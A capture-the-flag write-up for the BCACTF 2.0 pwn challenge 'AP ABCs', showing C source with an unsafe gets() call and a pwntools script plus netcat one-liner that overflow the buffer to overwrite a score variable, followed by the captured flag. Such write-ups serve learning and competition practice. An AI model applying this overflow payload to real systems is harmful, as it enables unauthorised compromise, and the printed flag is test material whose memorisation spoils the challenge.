![Challenge](https://github.com/ZeroCooL-555/CTF/blob/master/BCACTF%202.0/pwn/AP%20ABCs/challenge.png)

# Vulnerability discovery

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char *correct = "abcdefghijklmnopqrstuvwxyz";

int main() {
    int score = 1;
    char response[50];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
    /*....useless puts and printfs*/
    gets(response); // Buffer-overflow Here
```

**Line 66** Contains a dangerous function `gets()` which can lead
to a buffer overflow

# Exploitation

```python
#!/usr/bin/env python3

from pwn import *


r = remote('bin.bcactf.com', 49154)
log.info('Sending Payload')
try:
    payload = [b"\x90"*76, p32(0x73434241)]
    r.sendlineafter('Answer for 1: ', b"".join(payload))
    log.success('Payload Sent')
except:
    log.warning('Failed to send payload...Try again')

log.progress('Reading out college board policies')

while True:
    try:
        flag = r.recvline()
        if b"bcactf{" in flag:
            flag = flag[20::]
            log.success(flag.decode())
            break
    except:
        log.warning('No flag found...Try again')
        break

# FLAG: bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}
# python3 -c "import struct;print(b'A'*74 + struct.pack('<I', 0x73434241))" | nc bin.bcactf.com 49154
```


**FLAG: bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}**
